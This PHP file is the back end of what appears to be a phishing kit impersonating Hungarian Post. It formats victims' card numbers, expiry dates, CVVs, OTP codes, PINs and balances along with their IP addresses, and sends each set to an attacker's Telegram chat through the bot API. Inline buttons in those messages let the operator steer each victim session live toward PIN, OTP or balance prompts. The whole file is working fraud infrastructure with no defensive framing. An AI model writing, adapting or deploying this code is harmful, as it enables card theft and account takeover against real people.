<?php
require_once('functions.php');

/*
Telegram Funcs:.
*/
function file_get_contents_curl_sec($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);       

    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

function sendMsg($msg) {
  global $token;
  global $chat_id;

  $request = [
    'chat_id' => $chat_id, 
    'text' => $msg
  ];

  $request_url = 'https://api.telegram.org/bot' . $token . '/sendMessage?' . http_build_query($request);
  file_get_contents_curl_sec($request_url);
}

function sendCardInfo($sess, $cc_num, $cc_exp, $cc_kod) {

  $data = "\u{2705} New Hungria Posta CC Details Log!\n IP: " . $_SERVER['REMOTE_ADDR'] .
  "\n Card holder: " . $cc_hol .
  "\n Card number: " . $cc_num .
  "\n Expiration date: " . $cc_exp .
  "\n CVV: " . $cc_kod;
  
  sendLiveOpt($sess, $data, 
    "\u{274C} CC ERROR", 'CC_ERNO',
    "\u{1F7E2} PUSH", 'PUSH',
    "\u{1F4B5} BALANCE", 'BALANCE',
    "\u{1F4CC} PIN", 'PIN',
    "\u{1F4F2} OTP", 'OTP',
    "\u{274C} OTP ERROR", 'OTP_ERNO',
    "\u{2192} FINISH", 'FINISH');
}

function sendKodeInfo($sess, $kod) {
  $data = "\u{2705} New Hungria Posta OTP Log!\n IP: " . $_SERVER['REMOTE_ADDR'] .
  "\n Card number: " . returnDataSession($sess, 'cc_num') .
  "\n OTP Code: " . $kod;

  sendLiveOpt($sess, $data, 
    "\u{274C} CC ERROR", 'CC_ERNO',
    "\u{1F7E2} PUSH", 'PUSH',
    "\u{1F4B5} BALANCE", 'BALANCE',
    "\u{1F4CC} PIN", 'PIN',
    "\u{1F4F2} OTP", 'OTP',
    "\u{274C} OTP ERROR", 'OTP_ERNO',
    "\u{2192} FINISH", 'FINISH');
}

function sendPinInfo($sess, $kod) {
  $data = "\u{2705} New Hungria Posta PIN Log!\n IP: " . $_SERVER['REMOTE_ADDR'] .
  "\n Card number: " . returnDataSession($sess, 'cc_num') .
  "\n PIN Code: " . $kod;

  sendLiveOpt($sess, $data, 
    "\u{274C} CC ERROR", 'CC_ERNO',
    "\u{1F7E2} PUSH", 'PUSH',
    "\u{1F4B5} BALANCE", 'BALANCE',
    "\u{1F4CC} PIN", 'PIN',
    "\u{1F4F2} OTP", 'OTP',
    "\u{274C} OTP ERROR", 'OTP_ERNO',
    "\u{2192} FINISH", 'FINISH');
}

function sendBalanceInfo($sess, $balanc) {
  $data = "\u{2705} New Hungria Posta Balance Log!\n IP: " . $_SERVER['REMOTE_ADDR'] .
  "\n Card number: " . returnDataSession($sess, 'cc_num') .
  "\n Balance: " . $balanc;

  sendLiveOpt($sess, $data, 
    "\u{274C} CC ERROR", 'CC_ERNO',
    "\u{1F7E2} PUSH", 'PUSH',
    "\u{1F4B5} BALANCE", 'BALANCE',
    "\u{1F4CC} PIN", 'PIN',
    "\u{1F4F2} OTP", 'OTP',
    "\u{274C} OTP ERROR", 'OTP_ERNO',
    "\u{2192} FINISH", 'FINISH');
}

function sendLiveOpt($sess, $text, $btn_txt, $opt, 
  $btn_txt_2, $opt_2, 
  $btn_txt_3, $opt_3,
  $btn_txt_4, $opt_4,
  $btn_txt_5, $opt_5,
  $btn_txt_6, $opt_6,
  $btn_txt_7, $opt_7) {

	global $token;
	global $chat_id;

	$local_path = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

	$buttonParams = [
	    'sess' => $sess,
	    'opt' => $opt
	];

	$buttonParams_2 = [
	    'sess' => $sess,
	    'opt' => $opt_2
	];

	$buttonParams_3 = [
	    'sess' => $sess,
	    'opt' => $opt_3
	];

  $buttonParams_4 = [
      'sess' => $sess,
      'opt' => $opt_4
  ];

  $buttonParams_5 = [
      'sess' => $sess,
      'opt' => $opt_5
  ];

  $buttonParams_6 = [
      'sess' => $sess,
      'opt' => $opt_6
  ];

  $buttonParams_7 = [
      'sess' => $sess,
      'opt' => $opt_7
  ];

	$inlineKeyboard = [
	    [
	        ['text' => $btn_txt, 'url' => $local_path . '?' . http_build_query($buttonParams)],
          ['text' => $btn_txt_2, 'url' => $local_path . '?' . http_build_query($buttonParams_2)]
	    ],

      [   
          ['text' => $btn_txt_3, 'url' => $local_path . '?' . http_build_query($buttonParams_3)],
          ['text' => $btn_txt_4, 'url' => $local_path . '?' . http_build_query($buttonParams_4)]
      ],
      [
          ['text' => $btn_txt_5, 'url' => $local_path . '?' . http_build_query($buttonParams_5)],
          ['text' => $btn_txt_6, 'url' => $local_path . '?' . http_build_query($buttonParams_6)]
      ],
      [
          ['text' => $btn_txt_7, 'url' => $local_path . '?' . http_build_query($buttonParams_7)]
      ]
    ];

	$keyboardMarkup = [
	    'inline_keyboard' => $inlineKeyboard,
      'inline_keyboard' => $inlineKeyboard,
      'inline_keyboard' => $inlineKeyboard,
      'inline_keyboard' => $inlineKeyboard,
      'inline_keyboard' => $inlineKeyboard,
      'inline_keyboard' => $inlineKeyboard,
      'inline_keyboard' => $inlineKeyboard
	];

	$sendMessageParams = [
	    'chat_id' => $chat_id,
	    'text' => $text,
	    'reply_markup' => json_encode($keyboardMarkup)
	];

	$request_url = 'https://api.telegram.org/bot' . $token . '/sendMessage?' . http_build_query($sendMessageParams);
	file_get_contents_curl_sec($request_url);
}

?>